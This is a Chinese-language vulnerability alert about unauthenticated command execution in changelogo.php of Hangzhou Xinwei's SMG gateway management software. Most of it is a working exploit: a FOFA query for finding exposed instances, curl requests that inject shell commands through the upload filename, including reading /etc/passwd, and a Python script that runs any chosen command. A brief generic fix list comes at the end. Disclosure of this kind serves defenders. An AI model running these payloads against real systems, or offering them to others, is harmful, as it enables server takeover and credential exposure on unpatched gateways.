---
title: 【漏洞预警】杭州新威SMG网关 changelogo.php 命令执行漏洞
---

## 漏洞概述
杭州新威数字信息SMG网关管理软件 changelogo.php 存在命令执行漏洞，未经身份认证的攻击者可执行任意命令，控制服务器。

## 漏洞信息
| 属性 | 值 |
|------|-----|
| 漏洞名称 | 杭州新威数字信息SMG网关管理软件 changelogo.php 命令执行漏洞 |
| 漏洞类型 | 命令执行 |
| 影响组件 | SMG网关管理软件 |
| 严重程度 | 高危 |

## FOFA查询
```
body="text ml10 mr20" && (title="网关管理软件" || title="Gateway Management")
```

## POC
```bash
# 执行whoami
curl -X POST "http://target/changelogo.php" \
  -H "Content-Type: multipart/form-data; boundary=-WebKitFormBoundary1v98KI1jc9w1bG97" \
  --data-binary @- << 'EOF'
-----WebKitFormBoundary1v98KI1jc9w1bG97
Content-Disposition: form-data; name="file"; filename=";whoami;.gif"
Content-Type: image/gif

123321
-----WebKitFormBoundary1v98KI1jc9w1bG97
Content-Disposition: form-data; name="test"

-----WebKitFormBoundary1v98KI1jc9w1bG97--
EOF

# 读取/etc/passwd
curl -X POST "http://target/changelogo.php" \
  -H "Content-Type: multipart/form-data; boundary=-WebKitFormBoundary1v98KI1jc9w1bG97" \
  --data-binary @- << 'EOF'
-----WebKitFormBoundary1v98KI1jc9w1bG97
Content-Disposition: form-data; name="file"; filename=";cat /etc/passwd;.gif"
Content-Type: image/gif

123321
-----WebKitFormBoundary1v98KI1jc9w1bG97
Content-Disposition: form-data; name="test"

-----WebKitFormBoundary1v98KI1jc9w1bG97--
EOF
```

Python脚本:
```python
import requests

target = "http://target/changelogo.php"
cmd = "whoami"  # 替换为要执行的命令

files = {
    "file": (f";{cmd};.gif", "123321", "image/gif")
}
r = requests.post(target, files=files)
print(r.text)
```

## 修复建议
1. 联系厂商升级版本
2. 部署Web应用防火墙
3. 关闭互联网暴露面